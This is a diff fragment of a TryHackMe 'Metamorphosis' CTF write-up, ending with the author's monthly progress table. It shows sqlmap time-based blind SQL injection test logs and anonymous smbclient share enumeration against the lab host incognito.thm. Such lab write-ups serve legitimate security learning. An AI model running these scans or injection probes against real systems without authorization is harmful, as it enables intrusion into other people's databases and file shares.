+[23:19:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'
+[23:19:16] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
+[23:19:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:19:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[23:19:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[23:19:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[23:19:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[23:19:18] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[23:19:19] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[23:19:19] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[23:19:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[23:19:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[23:19:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[23:19:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
+[23:19:21] [INFO] testing 'Oracle AND time-based blind'
+[23:19:21] [INFO] testing 'Oracle AND time-based blind (comment)'
+[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
+[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
+[23:19:21] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
+[23:19:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - Parameter replace'
+[23:19:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)'
+[23:19:21] [INFO] testing 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)'
+[23:19:21] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
+[23:19:21] [INFO] testing 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause'
+[23:19:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)'
+[23:19:21] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+....
+
 
 ```
 
 
-```bash
-
-```
 
 
 ```bash
-
-```
-
-
-```bash
-
-```
-
-
-```bash
-
-```
-
-
-
-
-
-
 :~/Metamorphosis# smbclient -L incognito.thm/ -U "" -N
 
 	Sharename       Type      Comment
@@ -785,19 +1331,24 @@ it is recommended to perform only basic UNION tests if there is not at least one
 	print$          Disk      Printer Drivers
 	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
+```
 
 
+
+```bash
 :~/Metamorphosis# smbclient -U "" -N //incognito.thm/print$
 tree connect failed: NT_STATUS_ACCESS_DENIED
+```
 
 
 
-
+```bash
 :~/Metamorphosis# smbclient -U "" -N //incognito.thm/IPC$
 Try "help" to get a list of possible commands.
 smb: \> ls
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
-smb: \> 
+smb: \>
+```
 
 
 
@@ -1130,4 +1681,84 @@ smb: \> exit
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<img width="1894" height="889" alt="image" src="https://github.com/user-attachments/assets/ea28a534-a36e-4de6-ad52-e5dea67833b5" />
+
+<img width="1894" height="880" alt="image" src="https://github.com/user-attachments/assets/fe237b3b-e67a-4b8c-b3a6-d01a0196e75b" />
+
+
+<img width="1894" height="901" alt="image" src="https://github.com/user-attachments/assets/b9bc20ec-dccc-4b7d-a904-4dd481b61013" />
+
+
+
+
+<br>
+<br>
+<br>
+<h1 align="center">Completed</h1>
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/d970ea98-e261-437b-b4fa-60bf8d3d4247"></p>
+
+
+<h1 align="center">My TryHackMe Journey ・ 2025, December</h1>
+
+<div align="center"><h6>
+
+| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
+|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
+|27      |Medium 🚩 - Metamorphosis                       |11 |     101ˢᵗ  |     3ʳᵈ    |    4,966ᵗʰ   |       58ᵗʰ     |    135,348  |    1,053    |    84     |
+|26      |Hard 🚩 - The Great Disappearing Act            |10 |     101ˢᵗ  |     3ʳᵈ    |    5,091ˢᵗ   |       62ⁿᵈ     |    135,288  |    1,052    |    84     |
+|25      |Medium 🚩 - Profiles                             |9 |     100ᵗʰ  |     3ʳᵈ    |   13,969ᵗʰ   |      156ᵗʰ     |    135,198  |    1,051    |    84     |
+|24      |Medium 🔗 - YARA Rules - YARA mean one!          |8 |     100ᵗʰ  |     3ʳᵈ    |   10,263ʳᵈ   |      127ᵗʰ     |    135,168  |    1,050    |    84     |
+|24      |Easy 🔗 - Exploitation with cURL - Hoperation Eggsploit|8 |100ᵗʰ |     3ʳᵈ    |   12,804ᵗʰ   |      154ᵗʰ     |    135,144  |    1,049    |    84     |
+|24      |Medium 🔗 - Phishing - Phismas Greetings         |8 |     100ᵗʰ  |     3ʳᵈ    |   14,507ᵗʰ   |      174ᵗʰ     |    135,112  |    1,048    |    84     |
+|24      |Easy 🔗 - n8n: CVE-2025-68613                    |8 |     102ⁿᵈ  |     3ʳᵈ    |   18,279ᵗʰ   |      205ᵗʰ     |    135,064  |    1,047    |    84     |
+|24      |Medium 🔗 - C2 Detection - Command & Carol       |8 |     101ˢᵗ  |     3ʳᵈ    |   17,260ᵗʰ   |      193ʳᵈ     |    135,048  |    1,046    |    84     |
+|23      |Easy 🔗 - AWS Security - S3cret Santa            |7 |      99ᵗʰ  |     3ʳᵈ    |   16,068ᵗʰ   |      182ⁿᵈ     |    135,008  |    1,045    |    84     |
+|23      |Easy 🔗 - Malware Analysis - Malhare.exe         |7 |      99ᵗʰ  |     3ʳᵈ    |   17,332ⁿᵈ   |      191ˢᵗ     |    134,968  |    1,044    |    84     |
+|20      |Medium 🔗 - Containers - DoorDasher's Demise     |4 |     100ᵗʰ  |     3ʳᵈ    |   18,059ᵗʰ   |      206ᵗʰ     |    134,864  |    1,043    |    84     |
+|20      |Medium 🔗 - Forensics - Registry Furensics       |4 |     100ᵗʰ  |     3ʳᵈ    |   20,497ᵗʰ   |      239ᵗʰ     |    134,832  |    1,042    |    84     |
+|20      |Medium 🔗 - Web Attack Forensics - Drone Alone   |4 |     100ᵗʰ  |     3ʳᵈ    |   21,935ᵗʰ   |      243ʳᵈ     |    134,808  |    1,041    |    84     |
+|20      |Easy 🔗 - XSS - Merry XSSMas                     |4 |     100ᵗʰ  |     3ʳᵈ    |   23,069ᵗʰ   |      256ᵗʰ     |    134,792  |    1,040    |    84     |
+|20      |Easy 🔗 -  Race Conditions - Toy to The World    |4 |     100ᵗʰ  |     3ʳᵈ    |   24,717ᵗʰ   |      275ᵗʰ     |    134,768  |    1,039    |    84     |
+|20      |Medium 🔗 -  SOC Alert Triaging - Tinsel Triage  |4 |     100ᵗʰ  |     3ʳᵈ    |   25,202ⁿᵈ   |      286ᵗʰ     |    134,752  |    1,038    |    84     |
+|19      |Medium 🔗 -  ICS/Modbus - Claus for Concern      |3 |     101ˢᵗ  |     3ʳᵈ    |   28,869ᵗʰ   |      337ᵗʰ     |    134,658  |    1,037    |    84     |
+|19      |Easy 🔗 -  Passwords - A Cracking Christmas      |3 |     101ˢᵗ  |     3ʳᵈ    |   29,583ʳᵈ   |      340ᵗʰ     |    134,642  |    1,036    |    84     |
+|18      |Easy 🔗 -  Prompt Injection - Sched-yule conflict|2 |     101ˢᵗ  |     3ʳᵈ    |   30,518ᵗʰ   |      353ʳᵈ     |    134,626  |    1,035    |    84     |
+|18      |Medium 🔗 -  Obfuscation - The Egg Shell File    |2 |     101ˢᵗ  |     3ʳᵈ    |   30,967ᵗʰ   |      358ᵗʰ     |    134,618  |    1,034    |    84     |
+|17      |Medium 🔗 - CyberChef - Hoperation Save McSkidy  |1 |     101ˢᵗ  |     3ʳᵈ    |   32,378ᵗʰ   |      374ᵗʰ     |    134,602  |    1,033    |    84     |
+|7       |Medium 🔗 - Malware Analysis - Egg-xecutable     |2 |      95ᵗʰ  |     3ʳᵈ    |   11,604ᵗʰ   |      145ᵗʰ     |    134,544  |    1,034    |    84     |
+|7       |Easy 🔗 - Network Discovery - Scan-ta Clause     |2 |      95ᵗʰ  |     3ʳᵈ    |   18,575ᵗʰ   |      208ᵗʰ     |    134,522  |    1,033    |    84     |
+|7       |Easy 🔗 - React2Shell: CVE-2025-55182            |2 |      95ᵗʰ  |     3ʳᵈ    |   28,593ʳᵈ   |      326ᵗʰ     |    134,474  |    1,032    |    81     |
+|6       |Medium 🔗 - IDOR - Santa´s Little IDOR           |1 |      95ᵗʰ  |     3ʳᵈ    |   27,309ᵗʰ   |      328ᵗʰ     |    134,450  |    1,031    |    81     |
+|6       |Easy 🔗 - AI in Security - old sAInt nick        |1 |      95ᵗʰ  |     3ʳᵈ    |   41,626ᵗʰ   |      526ᵗʰ     |    134,426  |    1,030    |    81     |
+|6       |Medium 🔗 - Splunk Basics - Did you SIEM?        |1 |      95ᵗʰ  |     3ʳᵈ    |   44,647ᵗʰ   |      560ᵗʰ     |    134,410  |    1,029    |    81     |
+|6       |Easy 🔗 - Phishing - Merry Clickmas              |1 |      96ᵗʰ  |     3ʳᵈ    |   55,824ᵗʰ   |      674ᵗʰ     |    134,370  |    1,028    |    81     |
+|6       |Easy 🔗 - Linux CLI - Shells Bells               |1 |      97ᵗʰ  |     3ʳᵈ    |   53,003ʳᵈ   |      712ⁿᵈ     |    134,354  |    1,027    |    81     |
+
+</h6></div><br>
+
+<p align="center">Global All Time:    101ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/062327ee-a313-47f1-9852-f1608f3d3858"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/fd6d6295-0ce6-4f9c-9be6-f22a1da92af0"><br><br>
+                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/895c6d16-b76a-480c-bdeb-d261c79c134e"><br><br>
+                  Global monthly:   4,966ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c17b8c52-1ef4-460d-ad4c-3a7b0da8f95e"><br><br>
+                  Brazil monthly:      58ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b52a3337-bd67-43a7-8654-000b1fda3945"></p>
+
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
 
